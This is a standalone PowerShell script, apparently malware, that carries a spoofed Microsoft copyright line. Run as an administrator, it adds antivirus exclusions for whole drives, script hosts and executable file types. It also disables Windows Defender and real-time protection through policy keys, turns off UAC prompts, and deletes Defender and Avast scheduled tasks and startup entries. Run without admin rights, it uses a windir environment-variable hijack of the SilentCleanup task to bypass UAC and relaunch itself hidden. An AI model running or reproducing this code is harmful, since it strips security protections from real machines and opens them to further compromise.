if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Copyright (c) Microsoft Corporation.  All rights reserved.

Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  d:\
Add-MpPreference -ExclusionPath  e:\
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess Wscript.exe
Add-MpPreference -ExclusionProcess cscript.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess conhost.exe
Add-MpPreference -ExclusionProcess aspnet_compiler.exe
Add-MpPreference -ExclusionProcess mshta.exe
Add-MpPreference -ExclusionProcess explorer.exe
Add-MpPreference -ExclusionExtension exe
Add-MpPreference -ExclusionExtension vbs
Add-MpPreference -ExclusionExtension ps1
Add-MpPreference -ExclusionExtension cpl

reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MRT" /R
schtasks /Delete /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /F
schtasks /Delete /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /F
schtasks /Delete /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /F
schtasks /Delete /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /F
schtasks /Delete /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /F
schtasks /Delete /TN "Avast Emergency Update" /F
schtasks /Delete /TN "Avast Software\Overseer" /F

Powercfg /x -standby-timeout-ac 0
powercfg.exe /hibernate off

reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "AvastUI.exe" /f
reg add "HKLM\Software\Avast Software\Avast\properties\exclusions\Global" /v "ExcludeFiles" /t REG_SZ /d "C:\" /f
reg add "HKLM\SOFTWARE\Avast Software\Avast\properties\exclusions\Global" /v "ExcludeCommand" /t REG_SZ /d "ZXhwbG9yZXIuZXhlOw==" /f

} else {
    $ALOSH = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $ALOSH -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $ALOSH -Name $name
	
}
